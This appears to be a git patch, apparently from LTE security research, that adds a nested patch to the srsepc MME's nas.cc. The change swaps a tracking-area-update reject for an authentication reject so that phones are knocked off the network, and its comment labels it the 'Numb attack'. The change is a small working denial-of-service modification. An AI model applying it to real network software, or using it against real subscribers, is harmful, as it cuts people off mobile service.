@@ -1,0 +1,44 @@
+From c7b34b4113fe7f5e3456a9697c72c953e57dfb6a Mon Sep 17 00:00:00 2001
+From: Saalim <saalimwani@gmail.com>
+Date: Sat, 14 May 2022 21:20:44 +0200
+Subject: [PATCH 1/2]  revised patch numb
+
+---
+ 0001-revised-new-patch-for-numb.patch | 25 +++++++++++++++++++++++++
+ 1 file changed, 25 insertions(+)
+ create mode 100644 0001-revised-new-patch-for-numb.patch
+
+diff --git a/0001-revised-new-patch-for-numb.patch b/0001-revised-new-patch-for-numb.patch
+new file mode 100644
+index 000000000..08f9af82f
+--- /dev/null
++++ b/0001-revised-new-patch-for-numb.patch
+@@ -0,0 +1,25 @@
++From f2cba1c79af4d7c5d75435b8cd27b36fcf3d3a34 Mon Sep 17 00:00:00 2001
++From: Saalim <saalimwani@gmail.com>
++Date: Sat, 14 May 2022 21:07:51 +0200
++Subject: [PATCH] revised new patch for numb
++
++---
++ srsepc/src/mme/nas.cc | 2 +-
++ 1 file changed, 1 insertion(+), 1 deletion(-)
++
++diff --git a/srsepc/src/mme/nas.cc b/srsepc/src/mme/nas.cc
++index 6c8206398..ee40ef5ad 100644
++--- a/srsepc/src/mme/nas.cc
+++++ b/srsepc/src/mme/nas.cc
++@@ -848,7 +848,7 @@ bool nas::handle_tracking_area_update_request(uint32_t                m_tmsi,
++     nas_logger.error("Couldn't allocate PDU in %s().", __FUNCTION__);
++     return false;
++   }
++-  nas_tmp.pack_tracking_area_update_reject(nas_tx.get(), LIBLTE_MME_EMM_CAUSE_IMPLICITLY_DETACHED);
+++  nas_tmp.pack_authentication_reject(nas_tx.get()); // sending back authetication request towards  the UE => Numb attack
++   s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), *enb_sri);
++   return true;
++ }
++-- 
++2.25.1
++
+-- 
+2.25.1
+
